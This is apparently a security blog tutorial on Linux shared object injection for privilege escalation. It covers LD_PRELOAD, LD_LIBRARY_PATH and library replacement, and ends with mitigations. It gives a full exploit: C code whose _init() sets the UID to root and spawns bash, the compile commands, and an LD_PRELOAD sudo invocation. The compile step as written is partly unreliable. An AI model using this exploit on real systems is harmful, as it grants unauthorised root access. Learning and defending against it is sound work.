---
title: "Shared Object Injection"
description: 
date: 2025-01-26T13:50:55Z
image: /post/suid.jpg
math: 
license: 
hidden: false
comments: true
draft: false
tags: ["Privesc","Linux","SUID"]
categories: ["Linux-Privilege-Escalation","SUID-Attacks"]
---

### **Shared Object Injection for Privilege Escalation**

**Shared Object (SO) injection** is a technique where an attacker forces a process to load a malicious shared library (.so file) into its memory. When executed, the malicious code in the library runs with the privileges of the target process, potentially leading to privilege escalation if the process has higher privileges (e.g., root).

---

### **How Shared Object Injection Works**

1. **Shared Libraries in Linux**:
    
    - Linux dynamically links shared libraries (`.so` files) at runtime.
    - Applications specify required libraries in their code, and the system's **dynamic linker** loads them when the application starts.
    
1. **Manipulating Library Loading**:
    
    - Attackers can exploit library loading mechanisms, such as modifying environment variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`), or targeting programs that improperly handle library paths.
    
1. **Privilege Escalation**:
    
    - If an attacker can make a root-owned process load their malicious `.so` file, they can execute arbitrary code as root.

---

### **Techniques for Shared Object Injection**

#### 1. **Using `LD_PRELOAD`**:

- The `LD_PRELOAD` environment variable allows users to specify additional shared libraries to be loaded before any others.
- Exploit scenario:
    - A program with `sudo` permissions does not sanitize environment variables.
    - The attacker sets `LD_PRELOAD` to point to their malicious `.so` file.
- Example:
    
    ```bash
    echo 'void _init() { setuid(0); system("/bin/bash"); }' > exploit.c
    gcc -shared -fPIC -o exploit.so exploit.c
    LD_PRELOAD=./exploit.so sudo some-command
    ```
    

#### 2. **Hijacking `LD_LIBRARY_PATH`**:

- `LD_LIBRARY_PATH` specifies directories for the linker to search for shared libraries.
- Exploit scenario:
    - The attacker modifies `LD_LIBRARY_PATH` to include a directory containing malicious libraries.
- Example:
    
    ```bash
    export LD_LIBRARY_PATH=/tmp/malicious:$LD_LIBRARY_PATH
    ```
    

#### 3. **Replacing Legitimate Libraries**:

- Replace a shared library on the system with a malicious one.
- Exploit scenario:
    - Insufficient file permissions allow an attacker to overwrite a `.so` file used by a privileged program.

#### 4. **Dynamic Linking Exploits**:

- Exploit applications that dynamically load libraries during execution using functions like `dlopen()` or `dlsym()`.

---

### **Example: Privilege Escalation Using LD_PRELOAD**

1. **Create a Malicious Shared Object**:
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    void _init() {
        setuid(0);  // Set the UID to root
        system("/bin/bash");  // Spawn a root shell
    }
    ```
    
    Save this as `exploit.c` and compile:
    
    ```bash
    gcc -fPIC -shared -o exploit.so exploit.c
    ```
    
2. **Set LD_PRELOAD**:
    
    ```bash
    LD_PRELOAD=/path/to/exploit.so sudo some-command
    ```
    
3. **Result**: A root shell is spawned if the target process is vulnerable.
    

---

### **Mitigations Against SO Injection**

1. **Disable `LD_PRELOAD` for SUID Programs**:
    
    - Modern Linux systems ignore `LD_PRELOAD` for SUID binaries to prevent this type of attack.
2. **Restrict `LD_LIBRARY_PATH`**:
    
    - Limit the use of custom library paths in privileged programs.
3. **Secure File Permissions**:
    
    - Ensure shared libraries are owned by root and are not writable by unprivileged users.
4. **Use Static Linking**:
    
    - For critical programs, avoid dynamic linking altogether.
5. **Audit Programs**:
    
    - Identify and fix applications that dynamically load libraries without proper checks.
